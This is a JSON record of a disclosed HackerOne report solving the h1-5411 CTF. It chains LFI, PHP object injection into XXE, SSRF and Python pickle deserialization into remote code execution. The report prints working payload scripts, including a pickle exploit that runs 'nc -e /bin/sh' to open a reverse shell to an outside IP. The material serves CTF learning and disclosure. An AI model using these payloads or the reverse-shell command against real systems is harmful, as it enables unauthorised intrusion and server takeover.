@@ -1,0 +1,131 @@
+{
+  "id": 415222,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTUyMjI=",
+  "url": "https://hackerone.com/reports/415222",
+  "title": "Solution for h15411's CTF challenge",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-27T09:27:19.886Z",
+  "submitted_at": "2018-09-27T09:27:19.886Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "herrera",
+    "url": "/herrera",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/135/135/6dcad97a628cf9a89cc5394e378b04f49f3bb5b8_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 33314,
+    "url": "https://hackerone.com/h1-5411-ctf",
+    "handle": "h1-5411-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "h1-5411-CTF",
+      "twitter_handle": null,
+      "website": "http://tbd.com",
+      "about": null
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-22T16:26:40.190Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-22T16:26:40.109Z",
+  "team_member_agreed_on_going_public_at": "2018-10-22T16:02:15.755Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Baby steps\nEarlier today a friend tipped me off about an ongoing CTF challenge that was being run by HackerOne and would get the first ten winners a ticket to participate in #h15411, which will be a live-hacking event happening in Buenos Aires.\n\nThis immediately caught my attention and I decided to take a look to see how far I could get.\n\nThe first step was decoding the QR code that was in the tweet announcing the challenge (https://twitter.com/Hacker0x01/status/1044974142150373378) and then decoding the hexadecimal value obtained, which in turn gave me the URL of the challenge.\n\n## Game on!\n\nAfter accessing https://h1-5411.h1ctf.com, it's possible to notice that this application lets you generate memes from six templates which are divided into two different types. Three of which are of the type image and the other three, of type text. The template hidden input also caught my attention, which was apparently being used to load these templates from different files.\n\nThis was screaming \"PATH TRAVERSAL! LFI!\" which was indeed the first way I tried to tackle the challenge (type = image, template=../../../../../../etc/passwd) and needlessly to say I was rick rolled :´(\n\nShortly after, I tried to change the type to \"text\" instead of using the type \"image\" and it worked! I now had the ability to read local files from the server, a vulnerability known as LFI, short for Local File Inclusion.\n\nAfter downloading all the files from /var/www/html/ I started to analyze the code by first looking into /api/import_memes_2.0.php (because I noticed that in its code it utilized unserialize, which, in the past, has been the source of many vulnerabilities in all sorts of web applications).\n\nI quickly realized that it was possible to upload a file containing serialized code encoded in base64 through import_memes_2.0.php and that it would be saved in the session. Also, looking into /includes/classes.php, there was a class named ConfigFile that had the magic function __toString() which called $this->parse() and then finally tried to load XML from a string that it got from its constructor. This is perfect for an Object Injection attack, which by leveraging the magic method __toString() will allow me to control the value passed to the constructor of the ConfigFile class and then perform a XML External Entity attack when the parse() method is called.\n\n## Coding time\n\nThe next step was to create a small php program to generate valid serialized code using a placeholder as the payload.\n\n```\n<?php\n\trequire_once(\"../includes/config.php\");\n\n\t$config = new ConfigFile(\"data:text/html,placeholder\");\n\t$payload = serialize([$config]);\n\n\t// a:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:11:\"placeholder\";}}\n\techo $payload;\n?>\n```\nThen, using python, I created another program that takes a URL as the argument and creates a valid file ready to be uploaded to exploit the XXE vulnerability in the application.\n\nAfter all my attempts to get RCE using the XXE vulnerability failed, my next big bet was in a SSRF attack. I finished coding the program below and then it was a matter of time to scan the internal network and find the local server running in the port 1337.\n\n```\nimport base64, sys\n\nurl = sys.argv[1]\n\nxml = \"\"\"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE xxx [ <!ELEMENT xxx ANY >\n<!ENTITY payload SYSTEM \"php://filter/read=convert.base64-encode/resource=\"\"\" + url + \"\"\"\" >]>\n<test>\n    <toptext>&payload;</toptext>\n</test>\"\"\";\n\nxml_length = len(xml);\n\nstart = 'a:1:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:' + str(xml_length) + ':\"'\nend   = '\";}}'\n\nall = start+xml+end\nencoded = base64.b64encode(all)\n\nf = open(\"payload.memepak\", \"w\")\nf.write(encoded)\n```\n\n## Reading is fundamental\n\nBy reading the documentation API I was able to discover that setting the debug parameter to one would activate the debug mode.\n\nThen, still following the documentation, I made  a request to http://127.0.0.1:1337/status?debug=1 and it returned base64 encoded debug information, that when decoded looked like a pickle object. Shortly after, I made a request to http://127.0.0.1:1337/update-status?debug=1 which said that the status parameter was missing. I sent the request again, but now with the missing status parameter and the response was that it contained an incorrect padding. This got me thinking and then I sent a new request to http://127.0.0.1:1337/update-status?debug=1&status=MSsx (MSsx being 1+1 encoded in base64) and it returned a new debug message about not being able to find MARK.\n\nA quick search in Google and I confirmed my suspicion that this indeed was related to a Pickle Object Serialization vulnerability. Using the template published by mgeeky (https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd), I was able to create a payload that would exploit the vulnerability and force the challenge's server to establish a reverse shell with my server.\n\n```\nimport cPickle\nimport sys\nimport base64\n\nCOMMAND = \"nc -e /bin/sh 111.111.111.11 1337\"\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint base64.b64encode(cPickle.dumps(PickleRce()))\n```\n## Last words\nFinally, after getting a shell, I executed `ls` and  `cat flag.txt` and got the flag:\n**flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}**\n\nThanks for the challenge and for reading! I had a lot of fun solving it.\n\n## Impact\n\nThe attacker could achieve remote code execution which would allow him to get the flag that will get him invited to the #h15411 :)",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-11-21T16:02:15.801Z",
+  "allow_singular_disclosure_after": -235524474.0483281,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "herrera",
+    "mattberg",
+    "0xacb",
+    "ali",
+    "sameerphad72",
+    "htrgouvea",
+    "eveeez",
+    "bb00x",
+    "japz",
+    "b4l4",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
